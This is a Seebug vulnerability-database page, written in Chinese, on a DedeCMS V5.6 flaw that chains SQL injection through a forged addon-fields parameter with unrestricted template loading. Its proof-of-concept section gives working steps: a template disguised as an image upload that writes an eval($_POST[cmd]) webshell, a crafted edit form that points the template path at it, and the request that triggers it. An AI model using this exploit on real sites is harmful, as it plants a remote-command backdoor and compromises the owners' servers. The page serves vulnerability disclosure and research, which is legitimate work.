=== Content from www.seebug.org_0911ee4e_20250124_202425.html ===

![Seebug](/static/dist2/images/weixin-share-sm.jpg)

[![Knownsec-logo](/static/dist2/images/knownsec-logo.png)](https://www.knownsec.com?from=seebug_logo)
![](/static/dist2/images/line.png)
[![Seebug-logo](/static/dist2/images/seebug-logo2023.png?v=2)](/)

* [Index](/)
* [Submit Vulnerability](/contribute/vul)
* [Rank](/hackers)
* Market
  + [Exchange](/exchange/goods)
  + [Newest PoC](/vuldb/vulnerabilities?has_poc=true)
* [Search](/search/)* Community
    + [Pocsuite](http://pocsuite.org/)
    + [Ceye.io](http://ceye.io/)
    + [Paper](http://paper.seebug.org/)
    + [KCon](http://kcon.knownsec.com/)
    + [ZoomEye](https://www.zoomeye.org/)
  * About
    + [Data Statistics](/stat)
    + [Vul Market](/help/about)
    + [Develop Document](https://pocsuite.org/guide/what-is-pocsuite3.html)
    + [Guideline](/help/user_level)
    + [Feedback](/help/feedback)
    + [Help](/help/reward)

* [Login](/accounts/login/?next=/vuldb/ssvid-20050)
* [Register](/accounts/register?next=/vuldb/ssvid-20050)

Toggle navigation

* [Login](/accounts/login/?next=/vuldb/ssvid-20050)
* [Index](/)
* Reward and Rank
  + [Detail Reward List](/vuldb/reward/detail)
  + [PoC Reward List](/vuldb/reward/poc)
  + [Exchange](/exchange/goods)
  + [Rank](/hackers)
  + [Submit New Vulnerability](/contribute/vul)
* Vulnerability Database
  + [Vulnerability List](/vuldb/vulnerabilities)
  + [Component Categories](/appdir/)
  + [Vulnerability Category](/category/)
* [Search](/search/)
* [Data Statistics](/stat)
* [Paper](http://paper.seebug.org/)

# Dedecms &lt;= V5.6 Final模板执行漏洞

 Follow
0

### Basic Fields

SSV ID:
[SSV-20050](/help/vul#ssv)

Find Time:
Unknown

Submit Time:
2010-08-18

Level:

Category:
[嵌入恶意代码](/category/injecting-malware-codes)

Component:
[DedeCMS](/appdir/DedeCMS)

Author:
Unknown

Submitter:
[Knownsec](/accounts/profile/admin)

CVE-ID：
Add

CNNVD-ID：
Add

CNVD-ID：
Add

ZoomEye Dork：
Add

### Source

### Detail

Contributor
[Knownsec](/accounts/profile/admin)
Got  0KB

Dedecms V5.6 Final版本中的各个文件存在一系列问题，经过精心构造的含有恶意代表的模板内容可以通过用户后台的上传附件的功能上传上去，然后通过SQL注入修改附加表的模板路径为我们上传的模板路径，模板解析类：include/inc\_archives\_view.php没有对模板路径及名称做任何限制，则可以成功执行恶意代码。
1、member/article\_edit.php文件（注入）：
//漏洞在member文件夹下普遍存在，$dede\_addonfields是由用户提交的，可以被伪造，伪造成功即可带入sql语句，于是我们可以给附加表的内容进行update赋值。
…
//分析处理附加表数据
$inadd\_f = '';
if(!empty($dede\_addonfields))//自己构造$dede\_addonfields
{
$addonfields = explode(';',$dede\_addonfields);
if(is\_array($addonfields))
{
print\_r($addonfields);
foreach($addonfields as $v)
{
if($v=='')
{
continue;
}
$vs = explode(',',$v);
if(!isset(${$vs[0]}))
{
${$vs[0]} = '';
}
${$vs[0]} = GetFieldValueA(${$vs[0]},$vs[1],$aid);
$inadd\_f .= ','.$vs[0].&quot; ='&quot;.${$vs[0]}.&quot;' &quot;;
echo $inadd\_f;
}
}
}
…
if($addtable!='')
{
$upQuery = &quot;Update `$addtable` set typeid='$typeid',body='$body'{$inadd\_f},userip='$userip' where aid='$aid' &quot;; //执行构造的sql
if(!$dsql-&gt;ExecuteNoneQuery($upQuery))
{
ShowMsg(&quot;更新附加表 `$addtable` 时出错，请联系管理员！&quot;,&quot;javascript:;&quot;);
exit();
}
}
…
2、include/inc\_archives\_view.php：
//这是模板处理类，如果附加表的模板路径存在，直接从附加表取值；GetTempletFile获取模板文件的方法就是取的此处的模板路径，从来带进去解析。
…
//issystem==-1 表示单表模型，单表模型不支持redirecturl这类参数，因此限定内容普通模型才进行下面查询
if($this-&gt;ChannelUnit-&gt;ChannelInfos['addtable']!='' &amp;&amp; $this-&gt;ChannelUnit-&gt;ChannelInfos['issystem']!=-1)
{
if(is\_array($this-&gt;addTableRow))
{
$this-&gt;Fields['redirecturl'] = $this-&gt;addTableRow['redirecturl'];
$this-&gt;Fields['templet'] = $this-&gt;addTableRow['templet'];//取值
$this-&gt;Fields['userip'] = $this-&gt;addTableRow['userip'];
}
$this-&gt;Fields['templet'] = (empty($this-&gt;Fields['templet']) ? '' : trim($this-&gt;Fields['templet']));
$this-&gt;Fields['redirecturl'] = (empty($this-&gt;Fields['redirecturl']) ? '' : trim($this-&gt;Fields['redirecturl']));
$this-&gt;Fields['userip'] = (empty($this-&gt;Fields['userip']) ? '' : trim($this-&gt;Fields['userip']));
}
else
{
$this-&gt;Fields['templet'] = $this-&gt;Fields['redirecturl'] = '';
}
…
//获得模板文件位置
function GetTempletFile()
{
global $cfg\_basedir,$cfg\_templets\_dir,$cfg\_df\_style;
$cid = $this-&gt;ChannelUnit-&gt;ChannelInfos['nid'];
if(!empty($this-&gt;Fields['templet']))
{
$filetag = MfTemplet($this-&gt;Fields['templet']);
if( !ereg('/', $filetag) ) $filetag = $GLOBALS['cfg\_df\_style'].'/'.$filetag;
}
else
{
$filetag = MfTemplet($this-&gt;TypeLink-&gt;TypeInfos[&quot;temparticle&quot;]);
}
$tid = $this-&gt;Fields['typeid'];
$filetag = str\_replace('{cid}', $cid,$filetag);
$filetag = str\_replace('{tid}', $tid,$filetag);
$tmpfile = $cfg\_basedir.$cfg\_templets\_dir.'/'.$filetag;
if($cid=='spec')
{
if( !empty($this-&gt;Fields['templet']) )
{
$tmpfile = $cfg\_basedir.$cfg\_templets\_dir.'/'.$filetag;
}
else
{
$tmpfile = $cfg\_basedir.$cfg\_templets\_dir.&quot;/{$cfg\_df\_style}/article\_spec.htm&quot;;
}
}
if(!file\_exists($tmpfile))
{
$tmpfile = $cfg\_basedir.$cfg\_templets\_dir.&quot;/{$cfg\_df\_style}/&quot;.($cid=='spec' ? 'article\_spec.htm' : 'article\_default.htm');
}
return $tmpfile;
}
Dedecms V5.6 Final
厂商补丁:
DEDECMS
------------
目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：
http://www.dedecms.com/
![Loading icon](/static/dist2/bower_components/loading/loading-bars.svg)

[![R3start](https://images.telnet404.com/avatar.png)](/accounts/profile/t0n9)
have 1  exchange

### PoC (非 pocsuite 插件)

Contributor
[Knownsec](/accounts/profile/admin)
totally have   0.45KB

1.上传一个模板文件：
注册一个用户，进入用户管理后台，发表一篇文章，上传一个图片，然后在附件管理里，把图片替换为我们精心构造的模板，比如图片名称是：
uploads/userup/2/12OMX04-15A.jpg
模板内容是（如果限制图片格式，加gif89a）：
{dede:name runphp='yes'}
$fp = @fopen(&quot;1.php&quot;, 'a');
@fwrite($fp, '&lt;'.'?php'.&quot;\r\n\r\n&quot;.'eval($\_POST[cmd])'.&quot;\r\n\r\n?&quot;.&quot;&gt;\r\n&quot;);
@fclose($fp);
{/dede:name}
2.修改刚刚发表的文章，查看源文件，构造一个表单：
&lt;form class=&quot;mTB10 mL10 mR10&quot; name=&quot;addcontent&quot; id=&quot;addcontent&quot; action=&quot;http://127.0.0.1/dede/member/article\_edit.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; onsubmit=&quot;return checkSubmit();&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dopost&quot; value=&quot;save&quot; /&gt;
&lt;input type=&quot;hidden&quot; name=&quot;aid&quot; value=&quot;2&quot; /&gt;
&lt;input type=&quot;hidden&quot; name=&quot;idhash&quot; value=&quot;f5f682c8d76f74e810f268fbc97ddf86&quot; /&gt;
&lt;input type=&quot;hidden&quot; name=&quot;channelid&quot; value=&quot;1&quot; /&gt;
&lt;input type=&quot;hidden&quot; name=&quot;oldlitpic&quot; value=&quot;&quot; /&gt;
&lt;input type=&quot;hidden&quot; name=&quot;sortrank&quot; value=&quot;1275972263&quot; /&gt;
&lt;div id=&quot;mainCp&quot;&gt;
&lt;h3 class=&quot;meTitle&quot;&gt;&lt;strong&gt;修改文章&lt;/strong&gt;&lt;/h3&gt;
&lt;div class=&quot;postForm&quot;&gt;
&lt;label&gt;标题：&lt;/label&gt;
&lt;input name=&quot;title&quot; type=&quot;text&quot; id=&quot;title&quot; value=&quot;11233ewsad&quot; maxlength=&quot;100&quot; class=&quot;intxt&quot;/&gt;
&lt;label&gt;标签TAG：&lt;/label&gt;
&lt;input name=&quot;tags&quot; type=&quot;text&quot; id=&quot;tags&quot; value=&quot;hahah,test&quot; maxlength=&quot;100&quot; class=&quot;intxt&quot;/&gt;(用逗号分开)
&lt;label&gt;作者：&lt;/label&gt;
&lt;input type=&quot;text&quot; name=&quot;writer&quot; id=&quot;writer&quot; value=&quot;test&quot; maxlength=&quot;100&quot; class=&quot;intxt&quot; style=&quot;width:219px&quot;/&gt;
&lt;label&gt;隶属栏目：&lt;/label&gt;
&lt;select name='typeid' size='1'&gt;
&lt;option value='1' class='option3' selected=''&gt;测试栏目&lt;/option&gt;
&lt;/select&gt; &lt;span style=&quot;color:#F00&quot;&gt;\*&lt;/span&gt;(不能选择带颜色的分类)
&lt;label&gt;我的分类：&lt;/label&gt;
&lt;select name='mtypesid' size='1'&gt;
&lt;option value='0' selected&gt;请选择分类...&lt;/option&gt;
&lt;option value='1' class='option3' selected&gt;hahahha&lt;/option&gt;
&lt;/select&gt;
&lt;label&gt;信息摘要：&lt;/label&gt;
&lt;textarea name=&quot;description&quot; id=&quot;description&quot;&gt;1111111&lt;/textarea&gt;
(内容的简要说明)
&lt;label&gt;缩略图：&lt;/label&gt;
&lt;input name=&quot;litpic&quot; type=&quot;file&quot; id=&quot;litpic&quot; onchange=&quot;SeePicNew('divpicview',this);&quot; maxlength=&quot;100&quot; class=&quot;intxt&quot;/&gt;
&lt;input type='text' name='templet'
value=&quot;../ uploads/userup/2/12OMX04-15A.jpg&quot;&gt;
&lt;input type='text' name='dede\_addonfields'
value=&quot;templet,htmltext;&quot;&gt;（这里构造）
&lt;/div&gt;
&lt;!-- 表单操作区域 --&gt;
&lt;h3 class=&quot;meTitle&quot;&gt;详细内容&lt;/h3&gt;
&lt;div class=&quot;contentShow postForm&quot;&gt;
&lt;input type=&quot;hidden&quot; id=&quot;body&quot; name=&quot;body&quot; value=&quot;&amp;lt;div&amp;gt;&amp;lt;a href=&amp;quot;http://127.0.0.1/dede/uploads/userup/2/12OMX04-15A.jpg&amp;quot; target=&amp;quot;\_blank&amp;quot;&amp;gt;&amp;lt;img border=&amp;quot;0&amp;quot; alt=&amp;quot;&amp;quot; src=&amp;quot;http://127.0.0.1/dede/uploads/userup/2/12OMX04-15A.jpg&amp;quot; width=&amp;quot;1010&amp;quot; height=&amp;quot;456&amp;quot; /&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;p&amp;gt;&amp;amp;lt;?phpinfo()?&amp;amp;gt;1111111&amp;lt;/p&amp;gt;&quot; style=&quot;display:none&quot; /&gt;&lt;input type=&quot;hidden&quot; id=&quot;body\_\_\_Config&quot; value=&quot;FullPage=false&quot; style=&quot;display:none&quot; /&gt;&lt;iframe id=&quot;body\_\_\_Frame&quot; src=&quot;/dede/include/FCKeditor/editor/fckeditor.html?InstanceName=body&amp;amp;Toolbar=Member&quot; width=&quot;100%&quot; height=&quot;350&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;
&lt;label&gt;验证码：&lt;/label&gt;
&lt;input name=&quot;vdcode&quot; type=&quot;text&quot; id=&quot;vdcode&quot; maxlength=&quot;100&quot; class=&quot;intxt&quot; style='width:50px;text-transform:uppercase;' /&gt;
&lt;img src=&quot;http://127.0.0.1 /dede/include/vdimgck.php&quot; alt=&quot;看不清？点击更换&quot; align=&quot;absmiddle&quot; style=&quot;cursor:pointer&quot; onclick=&quot;this.src=this.src+'?'&quot; /&gt;
&lt;button class=&quot;button2&quot; type=&quot;submit&quot;&gt;提交&lt;/button&gt;
&lt;button class=&quot;button2 ml10&quot; type=&quot;reset&quot; onclick=&quot;location.reload();&quot;&gt;重置&lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/form&gt;
提交，提示修改成功，则我们已经成功修改模板路径。
3.访问修改的文章：
假设刚刚修改的文章的aid为2，则我们只需要访问：
http://127.0.0.1/dede/plus/view.php?aid=2
即可以在plus目录下生成webshell：1.php

[![0x153](https://images.telnet404.com/1631756596564?imageMogr2/thumbnail/64x64!/crop/!64x64a0a0)](/accounts/profile/0x153)
![](/static/dist2/images/anonymous.jpg)
![](/static/dist2/images/anonymous.jpg)
![](/static/dist2/images/anonymous.jpg)
[![R3start](https://images.telnet404.com/avatar.png)](/accounts/profile/t0n9)
have 5 Exchange

### Reference Linking

* <http://www.oldjun.com/blog/index.php/archives/70/>

### Solutions

**Temp Solutions**
**Official Solution**
**Defense Solutions**

Improve Solutions

BackSubmit

[![](/media/banner/2017/08/22/150338358279.png)](https://www.yunaq.com/)

[![](/media/banner/2020/05/26/159048249988.png)](https://www.yunaq.com/help/article?id=5ebcf0e3439fa500115a1326?from=seebugb00515)

[![](/media/banner/2017/08/09/150226089416.png)](https://scanv.yunaq.com/stcs/index.html?from=seebugb00526)

[![](/media/banner/2020/01/16/157914493733.png)](https://www.yunaq.com/dbzx?from=seebugb00115)

* [![](https://images.telnet404.com/avatar.png)](/accounts/profile/t0n9) 兑换PoC
* [![](https://images.telnet404.com/avatar.png)](/accounts/profile/t0n9) 兑换漏洞详情
* ![](/static/dist2/images/anonymous.jpg) 兑换PoC
* ![](/static/dist2/images/anonymous.jpg) 兑换PoC
* ![](/static/dist2/images/anonymous.jpg)anonymous 兑换PoC
* [![](https://images.telnet404.com/1631756596564?imageMogr2/thumbnail/64x64!/crop/!64x64a0a0)0x153](/accounts/profile/0x153) 兑换PoC

---

### Timeline

* 发现/披露了漏洞
* 2010-08-18
  提交了漏洞
* 2010-08-18
  提交补充了漏洞详情
* 2010-08-18
  提交更新了 PoC

---

### Related Vuls

* [DEDECMSV6 代码执行漏洞（CNVD-2021-75299）](/vuldb/ssvid-99476)
* [DedeCMS XML注入漏洞(CVE-2018-16784)](/vuldb/ssvid-99413)
* [Dedecms 身份绕过漏洞](/vuldb/ssvid-99392)
* [DedeCMS 未授权RCE漏洞](/vuldb/ssvid-99363)
* [DedeCMS 后台存在SSRF漏洞](/vuldb/ssvid-98044)
* [dedecms后台getshell](/vuldb/ssvid-97822)
* [DedeCMS V5.7 SP2前台文件上传漏洞 (CVE-2018-20129)](/vuldb/ssvid-97734)
* [dedecms 后台getshell](/vuldb/ssvid-97421)
* [DedeCMS后台地址爆破漏洞](/vuldb/ssvid-97326)
* [Dedecms后台任意文件上传漏洞](/vuldb/ssvid-97219)

 Follow
0

Popularity
3549

0

![](/static/images/anonymous.jpg)

##### Need to bind phone before comment. [Bind Now](https://sso.telnet404.com/accounts/bind_phone/)

Submit Comment

 anonymous reply

#### Unavailable Comments

※Any content provided by this site, only to learn the code and services, not for illegal purposes

captcha![]()

OK
Back

×
#### Hello,

您的会员可兑换次数还剩：
次

本次兑换将消耗 1 次

Vulnerabilities

* [Vulnerability List](/vuldb/vulnerabilities)
* [Component Categories](/appdir/)
* [Vulnerability Category](/category/)

More

* [Reward List](/vuldb/reward/poc)
* [Rank](/hackers)

Help

* [About](/help/about)
* [Relevant Instructions](/help/user_level)
* [Vulnerability Definition](/help/vul)
* [Reward Plan](/help/reward)

Contact

* 010-57076191
* s1@seebug.org
* 15th Floor, Unit A, Tower 3, Wangjing SOHO, Fu'an West Road, Chaoyang District, Beijing 100102, P.R.China

Public links

* [Knownsec](https://www.knownsec.com/#/)
* [yunaq](https://www.yunaq.com/cyd/?from=cj_cyd_sbug)
* [创宇蜜罐-诱捕溯源](https://mg.yunaq.com/#/?from=seebuglink)
* [ScanV](https://www.scanv.com/?from=seebug)
* [hackernews](http://hackernews.cc/)

Follow Us

[![](https://aqyzmedia.yunaq.com/labels/label_sm_90040.png)](https://v.yunaq.com/certificate?domain=www.seebug.org&from=label)

[![](/static/dist2/images/ksz-kcon-new.svg)](http://kcon.knownsec.com/)

[![](/static/dist2/images/seebug-logo2023.png)](/)

[![](/static/dist2/images/ksz-zoomeye.svg)](https://www.zoomeye.org/)

[![](/static/dist2/images/yunaq-logo.png)](https://www.yunaq.com/?from=sbg0702)

[京ICP备10040895号](https://beian.miit.gov.cn/)
[![](/static/dist2/images/beian.png)
京公网安备 11010502034610号](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010502034610)
Copyright @ 404 Team from Knownsec.
[简体中文](/accounts/language/?l=zh-cn)

×
#### Hello,

please call the customer service hotline to recharge, thank you for your continued support Seebug!

 010-57076191


